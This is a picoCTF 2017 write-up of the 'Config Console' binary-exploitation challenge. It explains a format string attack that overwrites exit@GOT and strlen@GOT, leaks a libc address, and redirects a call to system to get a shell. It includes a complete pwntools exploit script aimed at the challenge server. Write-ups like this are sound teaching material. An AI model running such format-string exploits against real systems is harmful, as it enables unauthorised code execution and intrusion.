# Config Console
#### Writeup by hgarrereyn
* **Binary Exploitation**
* *125 points*
* Description: In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. See if you can get a shell on shell2017.picoctf.com:26325. console Source

# Solution

This program was vulnerable to a format string attack. The following is from the `set_exit_message` function:

```c
printf("Exit message set!\n");
printf(message);

append_command('e', message);
exit(0);
```

In order to get the program to allow multiple format strings, I overwrote `exit@GOT` with the address for the `loop` function so that we will have more opportunities to use our attack. The message buffer is stored on the stack so this part isn't difficult.

Now, we have to figure out how to call `system`.

I leaked a libc address via `%2$lx` and was able to calculate the offset to `system` by running the binary on the webshell in `gdb`.

Then it is relatively simple to do multiple writes and overwrite `strlen@GOT` with the address to `system`. Once this is completed, we can call the `set_prompt` function which calls `strlen` for us on the buffer object:

```c
void set_prompt(char *prompt) {
    if (!prompt) {
        printf("No prompt chosen\n");
        exit(1);
    }
    if (strlen(prompt) > 10) {
        printf("Prompt too long\n");
        exit(1);
    }
    printf("Login prompt set to: %10s\n", prompt);

    append_command('p', prompt);
    exit(0);
}
```

If we send `p sh` the program will call `set_prompt("sh")` and we will have shell.

# Script

[**exploitConfigConsole.py**]()

```python
# By Harrison Green <hgarrereyn>

from pwn import *
import re

# Returns a string that writes up to two bytes to a specific memory address
# via a format string attack
def w(addr_raw, byte, one_byte):
	addr = str(hex(addr_raw))[2:]
	print(str(addr) + ' > ' + str(byte))
	val = str(int(byte,16)).zfill(4)
	addrStr = ""
	for i in range(0,len(addr),2):
		addrStr += chr(int(addr[i:i+2],16))

	s = "e %" + val + "x%16$h" + ("hn" if one_byte else "na") + "a" + addrStr[::-1] + (chr(0) * 5)
	return s

EXIT_GOT = 0x601258
STRLEN_GOT = 0x601210

# Connect
sock = remote('shell2017.picoctf.com', 26325)

# Overwrite EXIT_GOT with the address for loop() so the program loops instead
# of exiting
sock.send('e %2493x%16$hnaa\x58\x12\x60\x00\x00\x00\x00\x00\n')

# Fetch reference address
sock.send('e <%2$lx>\n')

# Parse reference address
resp = sock.recvuntil('>')
print('[' + resp + ']')
addr = int(re.search(r'<([a-f0-9]*)>', resp).group(1), 16)
print('Found address: ' + str(hex(addr)))

# Calculate system address
sys_addr = addr - 3564304
print('System should be at: ' + str(hex(sys_addr)))


# Prepare multistep format string attack
sys = str(hex(sys_addr))[2:]
sy = []

for i in range(0,len(sys),2):
	sy.append(str(hex(int(sys[i:i+2],16)))[2:])

sy = sy[::-1]

# Overwrite strlen with system
for i in range(0,len(sy)):
	sock.send(w(STRLEN_GOT+i, sy[i], True) + '\n')
	sock.recvuntil('Config')

# Get shell by calling system('sh')
sock.send('p sh\n')

# We've got shell
sock.interactive()
```
